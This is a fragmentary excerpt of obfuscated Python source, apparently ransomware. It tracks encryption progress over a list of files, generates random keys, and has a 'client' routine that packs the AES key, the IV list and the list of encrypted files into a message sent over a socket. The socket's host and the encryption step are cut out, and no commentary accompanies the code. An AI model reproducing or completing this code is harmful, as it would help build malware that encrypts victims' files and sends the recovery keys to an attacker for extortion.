...
def load ():#line:136
    ...
    for OOOO00O0O0OOOO0O0 in range (0 ,len(encflist2)):#line:138
        nmys .update_idletasks ()#line:139
        progressbar2 ['value']=OOOO00O0O0OOOO0O0 /len(encflist2) *100 #line:140
...
def rndk (OOO000OO0O0OOO00O ,ADCK2):#line:156
    rdnum= random.randint(1000,215485)
...
def client():
    try:
        sendmsg=["AESkey : "+str(AESkey)+"/  ",
                ...
                "ivlist : "+str(ivlist)+"/  ",
                "encflist : "+str(encflist)+"/  ",
                "encfcont : "+str(len(encflist))+"/  "]
        s=socket()
        ...
        try :#line:280
            if (os .path .isfile (O0O0OOO0O00OOO0O0 )):#line:281
                if get_value (O0O0OOO0O00OOO0O0 )!=None :#line:282
                    ...
                    progressbar3 ['value']=O0O0OOOOO0O0O0O00 /len(encflist2) *100 #line:285
